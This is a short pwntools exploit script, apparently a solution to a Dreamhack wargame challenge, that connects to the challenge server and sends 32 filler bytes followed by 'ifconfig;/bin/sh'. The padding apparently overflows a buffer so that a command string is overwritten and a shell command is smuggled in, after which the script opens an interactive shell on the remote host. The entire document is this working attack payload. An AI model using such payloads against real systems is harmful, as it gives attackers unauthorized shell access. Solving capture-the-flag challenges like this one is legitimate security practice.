from pwn import*
p = remote("host1.dreamhack.games", 17330)

p.sendline('a'*32 + "ifconfig;/bin/sh")
p.interactive()
